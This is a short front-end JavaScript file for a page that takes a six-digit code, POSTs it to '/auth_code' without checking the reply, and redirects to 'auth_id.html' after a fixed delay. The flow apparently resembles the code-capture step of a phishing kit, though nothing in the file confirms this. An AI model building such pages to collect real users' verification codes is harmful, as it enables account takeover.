const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const codeInput = document.querySelector("#code")
const subCode = document.querySelector("#sub_code")
const message = document.querySelector('.message')


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

document.addEventListener('DOMContentLoaded', codeInput.focus())

function submit(){
  const obj = {
    code : codeInput.value
}

  const baseURL = '/auth_code'
  fetch(baseURL, {
      method: 'POST',
      headers: {
          "Content-Type" : "application/json"
      },
      body: JSON.stringify(obj)
  })
}

codeInput.addEventListener('input', (event) => {
    let inputValue = event.target.value.replace(/\D/g, '')
    inputValue = inputValue.substring(0, 6)
  
    let formattedValue = '';
    for (let i = 0; i < inputValue.length; i++) {
      if (i === 3){
        formattedValue += '-';
      }
      formattedValue += inputValue[i];
    }
  
    event.target.value = formattedValue;
});
subCode.addEventListener('click', () => {
  if(codeInput.value !== '' && codeInput.value.length >= 7){
      submit()
      setTimeout(() => {
        window.location.href = 'auth_id.html'
      }, 5000)
  } else{
    message.style.display = 'block'
  }
})
codeInput.addEventListener('keyup', e => {
  if(e.keyCode == 13){
      event.preventDefault()
      if(codeInput.value !== '' && codeInput.value.length >= 7){
          submit()
          setTimeout(() => {
            window.location.href = 'auth_id.html'
          }, 5000)
      } else{
        message.style.display = 'block'
      }
  }
})